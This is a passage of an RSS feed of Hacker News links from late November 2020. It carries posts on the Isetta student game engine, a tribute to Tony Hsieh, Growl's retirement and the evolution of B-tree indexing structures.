</div></div>]]>
            </description>
            <link>https://simplelogin.io/blog/an-email-for-each-website/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25241372</guid>
            <pubDate>Sat, 28 Nov 2020 23:11:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Isetta: Writing a Game Engine from Scratch]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25241361">thread link</a>) | @da_big_ghey
<br/>
November 28, 2020 | https://isetta.io/blogs/week-0/ | <a href="https://web.archive.org/web/*/https://isetta.io/blogs/week-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div data-md-component="container">
          
            
              
            
            
              
            
          
          <div>
            <article>
              
                
                
                
<h2 id="introduction">Introduction<a href="#introduction" title="Permanent link">¶</a></h2>
<p>The Isetta Engine is a student-driven project about demystifying game engine development and providing a roadmap and relevant knowledge for novice developers. To do so, <a href="https://isetta.io/team/">our team</a> will make a game engine by ourselves starting from a collection of base frameworks, and document the process, pitfalls, and advice for our audience with periodic blogs. Besides that, we will conduct interviews with experienced professionals to augment our novice perspective. We believe the novice perspective from our blogs and expert perspective from the interviews will nicely come together and form a complete document to help people get started. </p>
<p>The reason we think more work needs to be done in this field is that too many game engine developers wait until the completion of the engine, typically years, to talk about their development. For studios, this is because they consider the final product to be the game, not the engine. For others, it may be because the engine is what they see as valuable, not the writing. As a result, these talks typically lose the minutiae of the actual daily struggles that took place in the development process. There are others who document their development which has been going on for years, which makes it a daunting task for newcomers to start following along. </p>
<p>Although the project is aimed at helping novice developers, this is not to be used as a sole source of learning engine development. Being new engine developers ourselves, we can't guarantee the way we develop the engine will be correct, which is why interviews will help the project remain grounded. This means others who are learning can use what we've done as a guide and not necessarily the ground truth. The blogs won't be a walkthrough/tutorial/step-by-step instructions on how to develop an engine. We are learning as we go and think our journey is what can be valuable to you. </p>
<h3 id="about-the-project">About the Project<a href="#about-the-project" title="Permanent link">¶</a></h3>
<p>This project is being done as a student-pitched project at the <a href="https://www.etc.cmu.edu/">Entertainment Technology Center</a> (ETC). The ETC is an interdisciplinary Master's degree program at Carnegie Mellon University where students' main focus is working on small teams on a project each semester during a 3-month time period. Throughout the semester, a team's work will be presented to faculty and peers with feedback and critique being presented to help aid in the project development. Our particular project idea has gone through multiple iterations to do the following:</p>
<ol>
<li>Simplify the engine to be feasible within 3 months and</li>
<li>Deliver content that would be useful, and hopefully enjoyable, to consume.</li>
</ol>
<p>As of writing this, we've learned that creating content that will satisfy both is difficult and time-consuming, so we will be focusing on writing these milestone-type blogs as well as posting various types of content to test which is the best form of presenting our work. The short project duration also forces us to think clearly about our scope and be lean on the features we include before starting. </p>
<h3 id="schedule">Schedule<a href="#schedule" title="Permanent link">¶</a></h3>
<p>During the course of this project <strong>(08/26 - 12/16, 2018</strong>), a blog post will be published every week to share our thoughts and process, and an interview will be published every 1-2 weeks. The interview schedule depends on our progress on the engine itself, as each interview's topic will be themed around our current work.</p>
<p>For latest schedule, see our <a href="https://isetta.io/schedule/">schedule</a> page.</p>
<h3 id="prerequisites">Prerequisites<a href="#prerequisites" title="Permanent link">¶</a></h3>
<p>Although we will cover some basic features of engine development, it will profoundly help if you have experience in C++ programming and developing software, especially games, as our project won't provide step-by-step instructions on how to do everything. For a list of resources on how to gain related knowledge, please go to the <a href="#Readings">Readings</a> section. Additional resources will be posted on our <a href="https://isetta.io/resources/">resource page</a>.</p>
<p>Another prerequisite is passion for learning game engine development. As you are still reading this, we assume you are as excited about this as we are. This will be a bumpy ride, but you will have us on your side.</p>
<h2 id="research">Research<a href="#research" title="Permanent link">¶</a></h2>
<p>Being a student-pitched ETC project means that the project needed to pass through a pitch process of consulting and convincing faculty in the program. This allowed us to receive feedback about what could be considered a reasonable/manageable scope and where we might hit challenges for a general project. For this project to be a valid ETC project as well as accomplish our mission statement, there needs to be a fine balance between documentation and development. </p>
<p>Before confronting the big monster of engine development and documentation, we thought it would be a good idea to gear up by getting input from people who have actually done this. During our pitch process, we reached out and got the chance to talk to numerous industry professionals and got extremely helpful advice from them. All of these suggestions helped us shape our project into what it is now and provided invaluable knowledge on how to start a game engine. Thus we encourage you, too, to approach professionals and get advice if possible. We've compiled our notes from our conversations with them into a write-up, which will be published soon.</p>
<h3 id="why-another-engine">Why another engine?<a href="#why-another-engine" title="Permanent link">¶</a></h3>
<p>Using an existing game engine like <a href="https://unity3d.com/">Unity</a>, <a href="https://www.unrealengine.com/en-US/what-is-unreal-engine-4">Unreal</a> or <a href="https://www.panda3d.org/">Panda3D</a> is always a handy option to make a game. These well-established engines have a strong collection of tools and APIs so that developers can focus on making the game, not the wheels. However, there is the limitation of not having full control over all systems in the engine as well as not knowing how the engine is processing the game logic and assets. These can obstruct the complex systems of an engine, so although you may have an understanding of how a physics or graphics engine works, each engine operates differently and optimizes for different constraints. </p>
<p>In terms of learning about game engines and how to develop one, these established engines aren't a good source. Panda3D, originally developed by Disney and expanded by past ETC projects, has an older codebase in 2018 with limited community involvement. It is also not using the current industry standard language (C++). Unity and Unreal are both too massive and too cutting-edge to be suitable engine learning material for novices. In addition, Unity's source code isn't publicly available so you technically can't learn from it. The huge codebase sets a high threshold for any beginner to get started.</p>
<h2 id="roadmap">Roadmap<a href="#roadmap" title="Permanent link">¶</a></h2>
<p>The Isetta Engine will support the most primitive form of networked multiplayer twin-stick shooter game. Networked multiplayer was selected to be a part of the engine because it offers significant design and development challenge on every level of the project, and will help differentiate this engine from others being developed. We decided to create the engine in 3D for two reasons: Most AAA engines are 3D, and 3D requires more math and problem solving for us as developers to learn and grow from.</p>
<p>While planning, and before we knew too much about game engines, we had a basic idea of what a game engine would consist of. The image below displays the second/third iteration of what the Isetta engine would look like. We were initially naive thinking we may be able to do both networking as well as physics, however quickly came to grips that would balloon the scope too much. The audio and graphics were and are still planned to be imported from external libraries, and more of the discussion of what is imported and why will be included in a future blog. This diagram of the engine will soon be replaced with more in-depth explanations.</p>
<p><img alt="alt_text" src="https://isetta.io/images/blogs/week-0/pitch_architecture.png" title="Engine Architecture During Pitch"></p>
<h3 id="genre">Genre<a href="#genre" title="Permanent link">¶</a></h3>
<p>As for our choice of the twin-stick shooter genre, we came to the decision after lengthy consideration of the components required to build other game types as well as how that genre would utilize multiplayer. Twin-stick shooters can effectively have little to no physics, which is different from collisions (this will be explained in <a href="https://isetta.io/blogs/week-1/">week 1 blog</a>). Likewise, the information passed between networked sessions is relatively minimal and not too strict on latency. What's more, a twin-stick shooter specializes in simplistic gameplay that doesn't need a world editor or too much design. </p>
<p>In a Skype meeting, <a href="https://waltdestler.com/">Walt Destler</a> explained to us that each game -and more particularly, each genre- requires vastly different netcode solutions. This is also one of the reasons why we prefer netcode over physics, as it can greatly narrow down the genre options. For example, multiplayer shooters, specifically PvP shooters, require small amounts of information to be passed (i.e. bullet and player locations) from server to client with relatively low latency. PvP shooters can also feature client-side prediction <sup id="fnref:0"><a href="#fn:0" rel="footnote">1</a></sup> as well as the additional requirement of lobby/matchmaking with usually more than 2 players. On the other hand, genres like turn-based strategy require large amounts of information to be passed (all units, decisions, resources, etc.) to all users without too much concern for latency or prediction.</p>
<h3 id="building-with-an-example-game">Building with an Example Game<a href="#building-with-an-example-game" title="Permanent link">¶</a></h3>
<p>The other piece of advice we frequently heard from professionals and our faculty alike was the benefit of developing a game in conjunction with the engine. Doing so, they explained, allows you to prove and demonstrate your engine works as expected. The game can also test features to show immediate edge cases of the engine. </p>
<p>Another nicety of developing an engine is that feature creep can be prevented when you keep expanding certain features that won't be utilized in the final product. What the game built from this engine <em>won't</em> be is something original or necessarily fun. However, that's not to say a fun, original game couldn't be created from this engine. The idea of our sample game is to intentionally be derivative so features of a basic twin-stick shooter will be already included in the engine, rather than only specific …</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://isetta.io/blogs/week-0/">https://isetta.io/blogs/week-0/</a></em></p>]]>
            </description>
            <link>https://isetta.io/blogs/week-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25241361</guid>
            <pubDate>Sat, 28 Nov 2020 23:09:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thank You, Tony]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25241102">thread link</a>) | @sethbannon
<br/>
November 28, 2020 | https://elizabethyin.com/2020/11/28/thank-you-tony/ | <a href="https://web.archive.org/web/*/https://elizabethyin.com/2020/11/28/thank-you-tony/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4860">
	
	<!-- .entry-header -->

	<div>
		
<p>Coincidentally enough, I had decided that I wanted to write a letter to my mentor Tony this weekend, thanking him for the huge impact he’s had on my life. But I suppose that has now morphed into a more public letter. </p>



<p>Being in a zombie, half blurry-eyed state, it’s a little tough to articulate well what Tony has meant to me. We go through life, and a lot of people have an impact on us, and it’s often hard to say that a particular person caused you to take a particular path. But, Tony is one of the few people whom I can definitely say my life would not at all be what it is without him. </p>



<p>I first met him many years ago in Dec 1996 when I was just starting high school. My best friend Jennifer asked me what I was doing for winter break and if I wanted to help out her cousin Tony with his new internet startup. I had no idea what an internet startup was, but I had nothing going on, so I agreed to go. </p>



<p>On the first day of our holiday break, Jennifer and I hopped on the Caltrain from the peninsula (Silicon Valley) to head to his office in SOMA (San Francisco). It was exciting! We couldn’t drive, but we could go to a startup office all by ourselves! I followed Jennifer to the address. I think their office was actually someone’s apartment. And when we got there, there seemingly was no one there. We hung around for a while, and maybe about 10am or so some people started to trickle in – this was my introduction to startup life. </p>



<p>Tony had more or less just graduated from Harvard, as he had spent a few short months at Oracle after graduation, and then decided to quit to build his own company LinkExchange. Leaving a big employer so quickly was highly unusual back then, and he would go on to do many non-conforming things that he was right about. </p>



<p>LinkExchange was an ad network. If you had a website and hosted LinkExchange ad banners, for every 2 impressions you generated, you received 1 free impression of your banner. Back then because the internet was still new, people paid attention to banners and clicked on them like crazy, so this was incredibly effective in helping generate traffic for people. LinkExchange would then sell the remaining ad impressions. They had launched the service earlier that year, and by that December, they were already growing like crazy. </p>



<p>I definitely was *not helpful*. We put together some tables and chairs. And made ethernet cables from scratch. Yes, from scratch. We had to cut cables, splice the individual wires, and insert them into plastic tips and crimp them. I was terrible at this, and Jennifer largely fixed all of my mistakes (as always). Since I was so bad at the ethernet cable making process, they asked me to help them put together an internal webpage to keep all their meetings / schedule together. Great! I could put my basic HTML skills to use. I don’t think they liked the amateurish turquoise background that I chose, so someone at LinkExchange quickly fixed it. </p>



<p>I was more of a nuisance than help, but what I saw that day was super inspiring. Here were a bunch of friends who were getting together to build things. They could wear whatever they wanted, saunter in whenever they wanted, and eat all the pizza they wanted. And they all had varied tasks and were taking business meetings in what looked like a kitchen? There was never a dull moment. It was the dream. Neither of my parents worked in tech and certainly not startups, so this was incredibly eye-opening, and immediately, I knew that this was what I was going to do when I grew up – become an entrepreneur and start companies. Without this exposure to startups in 1996, I don’t think I would have made this realization (if at all) for many years.</p>



<p>Fast forward a few years later. Microsoft bought LinkExchange just 2 years later for a reported $265m. Tony and his college friend Alfred (who also was at LinkExchange) decided to start a startup incubator with their own money. (As a side note, the food at their restaurant in this incubator was fantastic!) This was bold and unique, because Idealab was really the only one doing something somewhat similar at the time. The concept of accelerators or incubators would not come in a big way until years later. </p>



<p>I don’t think Tony knew this, but while in high school, I cold-emailed almost every single one of his portfolio companies to ask them for an internship. I was determined to work at a startup as soon as possible in high school and start my startup career. I ended up working at one of his portfolio companies (probably unbeknownst to him) in the summer of 2000 which really help set me on my path to a career in startups. Often that first opportunity is the hardest to land, and each subsequent opportunity opens more and more doors.</p>



<p>By late 2000, the stock market had crashed and everyone was fleeing startups. Newspapers ran headlines saying that tech was dead and that all programming jobs would be outsourced. They couldn’t have been more wrong, but most people panicked and stopped investing in startups. Tony, was always a first-principles thinker, and he leaned into this and ended up co-leading one of his portfolio companies Zappos. As an e-commerce company that provided free shipping and free returns, Zappos’ margins were razor thin. This scared most VCs. (This would certainly scare me.) But, he believed that it could work if customers had a great experience and would become repeat customers. So, he poured a lot of his own capital into the business when no VC at the time would touch this company. While many VCs pontificate about high level things, he looked at problems from a bottom’s up approach which made his thinking often unique from others. </p>



<p>In order to make the Zappos model work, he needed customer service to be top notch, reliable, and have a lower cost. It was clear to him that this model wouldn’t work in pricey San Francisco. So, he made another bold decision to move the company to Henderson, NV, which could provide all of those things. This was at a time when certainly most people believed you can only build an internet business in the San Francisco Bay Area. In hindsight, when they ended up needing to hire tons of people, being the BEST internet company in the Las Vegas area allowed them to swoop up talent that would have been a huge war to win in San Francisco.  The other thing that was apparent to me, is that the Zappos family was incredibly diverse — and free to be themselves. Tony’s attention to culture and cultivating an open and welcoming work family left a lasting impact on me, and he started doing this well before it became a trend. Like so many of you, his book <em>Delivering Happiness</em> has affected my own thinking.</p>



<p>Fast forward many years, Jennifer and I were working on our own startup, and we were grappling with a particular challenge. We decided to consult Tony and get his advice. In a very Tony-like way, he basically told us to do what we thought was best. I remember feeling frustrated at the time, because…I didn’t know what was best! I had wanted him to tell me what he thought was best! But a good mentor helps you find your own answer – he/she doesn’t tell you the answer.  </p>



<p>In that meeting, he also pulled out a book and told me to read it. The book was <em>Start with Why</em> by Simon Sinek. So I read it. The gist of the book is that to build a great company, you need to go back to first principles. Most people start building a company by trying to sell their product details. “Buy my shoes! They are grey with stripes.” But customers, employees, and everyone want to rally around something much bigger — something inspirational that the company stands for. It actually took me many years to process this and actually figure out how to implement this — I didn’t get this right for LaunchBit, but after marinating on this advice for years, this is what we’ve been striving to do at Hustle Fund. We aren’t just capital deployers. We are trying to create a movement and a philosophy. That particular meeting with Tony is one that I play in my head over and over – I feel like I finally understand what he was getting at and that is what I most wanted to tell him this weekend. </p>



<p>If cynics believe that it’s impossible to get ahead in life without being an asshole, Tony Hsieh is a good example of someone who defies the norm. He was never flashy and always kind and generous to all. I could go on and on in writing this, but thank you, Tony, for helping me in so many ways that you may not have been aware. For your kindness, generosity, and inspiration.</p>



<p>Sending big hugs to the entire Hsieh family whom I consider to be my second family and who took me in during my formative years and had a huge impact on who I am today.</p>
	</div><!-- .entry-content -->

	
	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>https://elizabethyin.com/2020/11/28/thank-you-tony/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25241102</guid>
            <pubDate>Sat, 28 Nov 2020 22:31:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Growl in Retirement]]>
            </title>
            <description>
<![CDATA[
Score 366 | Comments 173 (<a href="https://news.ycombinator.com/item?id=25241030">thread link</a>) | @flyingyeti
<br/>
November 28, 2020 | http://336699.org/GrowlRetirement | <a href="https://web.archive.org/web/*/http://336699.org/GrowlRetirement">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="container">
  <article id="8GugXoUrk4po3a8J7EZnDS">
	<time datetime="2020-11-28">November 28, 2020</time>
  
	<p>Growl is being retired after surviving for 17 years. With the announcement of Apple’s new hardware platform, a general shift of developers to Apple’s notification system, and a lack of obvious ways to improve Growl beyond what it is and has been, we’re announcing the retirement of Growl as of today.</p>

<p>It’s been a long time coming. Growl is the project I worked on for the longest period of my open source career. However at WWDC in 2012 everyone on the team saw the writing on the wall. This was my only WWDC. This is the WWDC where Notification Center was announced. Ironically Growl was called Global Notifications Center, before I renamed it to Growl because I thought the name was too geeky. There’s even a sourceforge project for Global Notifications Center still out there if you want to go find it.</p>

<p>We’ve had a lot of support over the years; from our hosting providers at <a href="http://www.networkredux.com/">Network Redux</a>, <a href="http://www.cachefly.com/">CacheFly</a> and others, to all of the apps using our framework, bindings, or any other integration. Special thanks go to <a href="https://adium.im/">Adium</a> and <a href="https://colloquy.app/">Colloquy</a>. Without these two projects having developers who wanted different types notifications, Growl wouldn’t have existed. Without Growl I do not know that we would have any sort of decent notification system in OS X, iOS, Android or who knows what else. </p>

<p>Special thanks goes to <a href="https://www.transifex.com/">Transifex</a> who made localizing into 24 languages a lot easier than anything else we tried. It’s a fantastic product, if you make software please try it. Our localizers were fantastic people and should all be commended for their work. </p>

<p>For developers we recommend transitioning away from Growl at this point. The apps themselves are gone from the app store, however the code itself still lives. Everything from our rake build system to our code is available for use on our <a href="https://github.com/growl/growl/">GitHub page</a></p>

  <figure id="kudo_8GugXoUrk4po3a8J7EZnDS">
    <a href="#kudo">
      
    </a>
    <p>1,609</p>
    <p>Kudos</p>
  </figure>
  <figure id="kudo_side_8GugXoUrk4po3a8J7EZnDS">
    <a href="#kudo">
      
    </a>
    <p>1,609</p>
    <p>Kudos</p>
  </figure>
</article>

</section></div>]]>
            </description>
            <link>http://336699.org/GrowlRetirement</link>
            <guid isPermaLink="false">hacker-news-small-sites-25241030</guid>
            <pubDate>Sat, 28 Nov 2020 22:19:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blogging vs. Blog Setups]]>
            </title>
            <description>
<![CDATA[
Score 229 | Comments 95 (<a href="https://news.ycombinator.com/item?id=25240939">thread link</a>) | @Kye
<br/>
November 28, 2020 | https://rakhim.org/honestly-undefined/19/ | <a href="https://web.archive.org/web/*/https://rakhim.org/honestly-undefined/19/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Hi, I'm Rakhim. I teach, program, make podcasts, comics and videos on computer science at <a href="https://codexpanse.com/">Codexpanse.com</a>. You can learn more about <a href="https://rakhim.org/about">my work</a> and even <a href="https://www.patreon.com/rakhim">support me</a> via Patreon.</p><p><form action="https://buttondown.email/api/emails/embed-subscribe/rakhim" method="post" target="popupwindow" onsubmit="window.open('https://buttondown.email/rakhim','popupwindow')"><label for="bd-email">Oh, and I have a monthly non-spammy personal newsletter:</label><br>

</form></p><nav><p><a href="https://rakhim.org/">Home</a>
<span>|</span>
<a href="https://blog.rakhim.org/">Blog</a>
<span>|</span>
<a href="https://rakhim.org/about">About</a>
<span>|</span>
<a href="https://codexpanse.com/">Courses</a>
<span>|</span>
<a href="https://rakhim.org/talks">Talks</a>
<span>|</span>
<a href="https://rakhim.org/honestly-undefined">Comics</a>
<span>|</span>
<a href="https://rakhim.org/bookshelf">Bookshelf</a>
<span>|</span>
<a href="https://www.youtube.com/c/codexpanse">YT</a>
<span>|</span>
<a href="https://twitter.com/freetonik">TW</a>
<span>|</span>
<a href="https://rakhim.org/index.xml">RSS</a></p></nav><p>© Rakhim Davletkaliyev, 2020<br>Powered by <a href="https://gohugo.io/">Hugo</a>, <a href="https://www.netlify.com/">Netlify and the Everett interpretation of QM.</a></p></div></div>]]>
            </description>
            <link>https://rakhim.org/honestly-undefined/19/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25240939</guid>
            <pubDate>Sat, 28 Nov 2020 22:03:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Evolution of tree data structures for indexing: more exciting than it sounds]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25240883">thread link</a>) | @erthalion
<br/>
November 28, 2020 | https://erthalion.info/2020/11/28/evolution-of-btree-index-am/ | <a href="https://web.archive.org/web/*/https://erthalion.info/2020/11/28/evolution-of-btree-index-am/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><span>28 Nov 2020</span></p><h2 id="0-how-to-read-me">0. How to read me?</h2>
<p>I have to admit, my research blog posts are getting longer and longer. From one
side I find it genuinely encouraging, because if one gets so much information
just by scratching the topic, imagine what’s hidden beneath the surface! One
university professor once said “what could be interesting in databases?”, and
it turns out freaking a lot! On the other side it certainly poses problems for
potential readers. To overcome them I would suggest an interesting approach:
print this blog post out, or open it on your tablet/e-reader, where you can
make notes with a pencil or markers. Now while reading it try to spot ideas
particularly exciting for you and mark them. Along the way there would be
definitely some obscure parts or questions, write them on the sides as well.
You can experiment with the diagrams, changing or extending them, or just
drawing funny faces. But do not read everything at once, have no fear of
putting it aside for a while, and read in chunks that are convenient for you.
Some parts could be skipped as the text is build out of relatively independent
topics. The table of contents can help and guide you. Having said that we’re
ready to embark on the journey.</p>
<ul>
<li>
<a href="#1-introduction">Introduction</a>
</li>
<li>
<a href="#2-rum-conjecture">RUM conjecture</a>
</li>
<li>
<a href="#3-b-tree-basics">B-tree basics</a>
</li>
<li>
<a href="#4-beyond-the-hard-leaves-of-basics">Beyond the hard leavers of
basics</a>
<ul>
<li>
<a href="#41-key-normalization">Key normalization</a>
</li>
<li>
<a href="#42-prefix-truncation">Prefix truncation</a>
</li>
<li>
<a href="#43-dynamic-prefix-truncation">Dynamic prefix truncation</a>
</li>
<li>
<a href="#44-suffix-truncation">Suffix truncation</a>
</li>
<li>
<a href="#45-indirection-vector">Indirection vector</a>
</li>
<li>
<a href="#46-sb-tree">SB-tree</a>
</li>
</ul>
</li>
<li>
<a href="#5-why-is-it-not-enough">Why is it not enough?</a>
<ul>
<li>
<a href="#51-partitioned-b-tree">Partitioned B-tree</a>
</li>
<li>
<a href="#52-hybrid-indexes">Hybrid indexes</a>
</li>
<li>
<a href="#53-bw-tree">Bw-Tree</a>
</li>
<li>
<a href="#54-dptree">DPTree</a>
</li>
</ul>
</li>
<li>
<a href="#6-trie">Trie</a>
</li>
<li>
<a href="#7-learned-indexes">Learned indexes</a>
</li>
<li>
<a href="#8-is-that-all">Is that all?</a>
</li>
<li>
<a href="#references">References</a>
</li>
</ul>
<h2 id="1-introduction">1. Introduction</h2>
<p>Whenever we speak about indexes, especially in PostgreSQL context, there is a
lot to talk about: B-tree, Hash, GiST, SP-GiST, GIN, BRIN, RUM. But what if I
tell you that even the first item in this list alone hiding astonishing number
of interesting details and years of research? In this blog post I’ll try to
prove this statement, and we will be concerned mostly with B-tree as a data
structure.</p>
<p><img src="https://erthalion.info/public/img/btree-joke.png" width="80%"></p>

<p>Let’s start systematically and take a look at the definition first:</p>
<blockquote>
<p>B-tree is a self-balancing tree data structure that maintains sorted data and
allows searches, sequential access, insertions, and deletions in logarithmic
time.</p>
</blockquote>
<p>What is your first association with the concept of B-tree? Mine is “old and
well researched, or in other words boring”. And indeed apparently it was first
introduced in <a href="https://infolab.usc.edu/csci585/Spring2010/den_ar/indexing.pdf">1970</a>! Not only that, already in 1979 they
were <a href="http://cgi.di.uoa.gr/~ad/M149/ubiquitous_btree.pdf">ubiquitous</a>. Does it mean there is nothing exciting left any
more? Once upon a time I came across a remarkable read called
<a href="https://dl.acm.org/doi/10.1561/1900000028">Modern B-Tree techniques</a> which inspired me to dig
deeper into the topic and read bunch of shiny new whitepapers. Afterwards
totally by chance I’ve stumbled upon a book “Database Internals: A Deep Dive
into How Distributed Data Systems Work”, which contains great sections on
B-tree design. Both works were the triggers to write this blog post. What was I
saying about nothing exciting left? At the end I couldn’t be more wrong.</p>
<p>It turns out that there are multitude of interesting ideas and techniques
around B-Trees. They’re all coming from the desire to satisfy different (often
incompatible) needs, as well as adapt to emerging hardware. To demonstrate how
many of those exist, lets play a game. Below you can find a table of names I’ve
found in various science papers, together with a couple of silly names I’ve
come up myself. Can you find out the fake ones?</p>
<table>
<tbody>
<tr>
<td>B-tree</td>
<td>B<sup>+</sup>-tree</td>
<td>B<sub>link</sub>-tree</td>
<td>DPTree</td>
</tr>
<tr>
<td>wB<sup>+</sup>-tree</td>
<td>NV Tree</td>
<td>FPTree</td>
<td>FASTFAIR</td>
</tr>
<tr>
<td>HiKV</td>
<td>Masstree</td>
<td>Skip List</td>
<td>ART</td>
</tr>
<tr>
<td>WORT</td>
<td>CDDS Tree</td>
<td>Bw Tree</td>
<td>HOT</td>
</tr>
<tr>
<td>KISS Tree</td>
<td>VAST Tree</td>
<td>FAST</td>
<td>HV Tree</td>
</tr>
<tr>
<td>UB Tree</td>
<td>LHAM</td>
<td>MDAM</td>
<td>Hybrid B<sup>+</sup> Tree</td>
</tr>
</tbody>
</table>

<p>Any ideas? Well, I have a confession to make – all of them are real, I just
don’t have enough imagination to come up with such names. Having this in mind
hopefully you understand that if we want to make a survey, the first step would
be to establish some classification. Not only this will help us to structure
the material, but also will explain why on earth anyone would need to invent so
many variations of what we though was so simple!</p>
<h2 id="2-rum-conjecture">2. RUM conjecture</h2>
<p>To classify different index access methods we need to think about the following
ambitious question – is there anything common between almost any index access
method? The authors of <a href="https://stratos.seas.harvard.edu/files/stratos/files/rum.pdf">RUM conjecture</a> provide an interesting
insight about this topic:</p>
<blockquote>
<p>The fundamental challenges that every researcher, systems architect, or
designer faces when designing a new access method are how to minimize, i)
read times, ii) update cost , and iii) memory (or storage) overhead.</p>
<p>In this paper, we conjecture that when optimizing the read-update-memory
overheads, optimizing in any two areas negatively impacts the third</p>
</blockquote>
<p>This essentially states that if an index access method could be specified as a
point inside “Read”, “Update” (on the Fig. 1 it’s called “Write” for
convenience of drawing), “Memory” space we can observe an interesting
invariant. Every time we modify one index access method to have less overhead
for reading or memory footprint (i.e. shift the corresponding point closer to
“Read”/”Memory” corners), we inevitably loose on the updating workload (i.e.
getting further away from “Write” corner).</p>
<figure>
<img src="https://erthalion.info/public/img/rum.png" width="50%">
<br>
<figcaption>
Fig 1. RUM space
</figcaption>
</figure>
<p>In fact as a non-scientist I would even speculate that there should be another
dimension called “Complexity”, but the idea is still clear. I will try to show
this invariant at work via examples in this blog post, but it already gives us
some ground under the feet and opportunity to visually represent different
versions of B-tree by moving point on the triangle back and forth. But first
let’s recall the basics.</p>
<h2 id="3-b-tree-basics">3. B-tree basics</h2>
<p>So what is B-tree? Well, it’s a tree data structure: a root node, some number
of branch nodes (marked grey) and a bunch of leaf nodes (marked green):</p>
<figure>
<img src="https://erthalion.info/public/img/btree.png" width="100%">
<br>
<figcaption>
Fig 2. B-tree nodes arrangement
</figcaption>
</figure>
<p>Every node of this tree is usually a page of some certain size and contains
keys (shaded slices of a node) and pointers to other nodes (empty slices with
arrows). Keys on page are kept in sorted order to facilitate fast search within
a page.</p>
<p>The original B-tree design assumed to have user data in all nodes,
branch and leaf. But nowadays the standard approach is a variation called
B<sup>+</sup>-tree, where user data is present only in leaf nodes and branch
nodes contains separator keys (pivot tuples in PostgreSQL terminology). In this
way separation between branch and leave nodes become more strict, allowing
better flexibility for choosing format of former and making deletion operations
can affect only latter. In fact the original B-tree design is barely worth
mentioning these days and I’m doing this just to be precise. Since
B<sup>+</sup>-tree is sort of default design, we’ll use B-tree and
B<sup>+</sup>-tree interchangeably in this text from now on. An interesting
thing to mention here is that the only requirements for separator keys is to
guide search algorithm to a correct leaf node. As long as they fulfil this
condition they can contain anything, no other requirements exist.</p>
<p>Strictly speaking, only child pointers are truly necessary in this design, but
quite often databases also maintain additional neighbour pointers, e.g. what you
can see on the Fig. 2 between the leaf nodes. It could be helpful for some
operations like index scan, but need to be taken into account for node
split/merge operations. PostgreSQL uses <a href="https://www.csd.uoc.gr/~hy460/pdf/p650-lehman.pdf">Lehman-Yao</a> version,
called B<sub>link</sub>-tree, with links to both left and right sibling nodes
(the left link one is actually not presented in the original
B<sub>link</sub>-tree design, and it makes backward scan somewhat interesting),
and there are even implementations like WiredTiger with
<a href="https://github.com/wiredtiger/wiredtiger/blob/f08bc4b18612ef95a39b12166abcccf207f91596/src/include/btmem.h#L550">parent pointers</a>.</p>
<p>Having all this in place one can perform a search query by following the path
marked red on the Fig. 2, first hitting the root, finding a proper separator
key, following a downlink and landing on a correct page where we deploy binary
search to find the resulting key.</p>
<p>Until now, we were talking only about static parts of B-tree design, but of
course there is more to it. For example there is one dynamic aspect of much
importance (quite often it even scares developers like a nightmare), namely
page splits. What do we need to do when there is a new value to insert, but the
target page does not have enough space like on the following diagram?</p>
<figure>
<img src="https://erthalion.info/public/img/page-split-1.png" width="60%">
<br>
<figcaption>
Fig 3. B-tree page split (a)
</figcaption>
</figure>
<p>What happens here is we’re trying to insert the new value (shaded box) into the
page with not enough space for it. To maintain the three balanced we need to
allocate another leaf page, distribute keys between old and new leaf, promote a
new separator key into the parent page and update all required links
(left/right siblings if present):</p>
<figure>
<img src="https://erthalion.info/public/img/page-split-2.png" width="60%">
<br>
<figcaption>
Fig 4. B-tree page split (b)
</figcaption>
</figure>
<p>Curiously enough the new separator key could be chosen freely, it could be any
value as long as it separates both pages. We can see what does it change in the
optimization section.</p>
<p>Locking is obviously an important part of a page split. No one wants to end up
with concurrency issues when pages get updated while in the middle of a split,
so a page to be split is write-locked as well as e.g. right sibling to update
left-link if present.</p>
<p>As you can see, page splits are introducing performance overhead. We need to
bring in a new page, move elements around and everything should be consistent
and correctly locked. And already at this pretty much basic point we already
can see some interesting trade-offs. For example B*-tree modification tries to
rebalance data between neighbouring nodes to postpone page split as long as
possible. In terms of trade-offs it looks like a balance between complexity and
insert overhead.</p>
<p>I didn’t tell you everything about B<sub>link</sub>-tree and it’s going to be our next
topic example in this section. Not only Lehman-Yao version adds a link to the
neighbour, it also introduces a “high key” to each page, which is an upper bound
on the keys that are allowed on page. While obviously introducing a bit memory
overhead those two changes make it possible to detect a concurrent page split
by checking the page high key, which allows the tree to be searched …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://erthalion.info/2020/11/28/evolution-of-btree-index-am/">https://erthalion.info/2020/11/28/evolution-of-btree-index-am/</a></em></p>]]>
            </description>
            <link>https://erthalion.info/2020/11/28/evolution-of-btree-index-am/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25240883</guid>
            <pubDate>Sat, 28 Nov 2020 21:54:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Second Swiss firm allegedly sold encrypted spying devices]]>
            </title>
            <description>
<![CDATA[
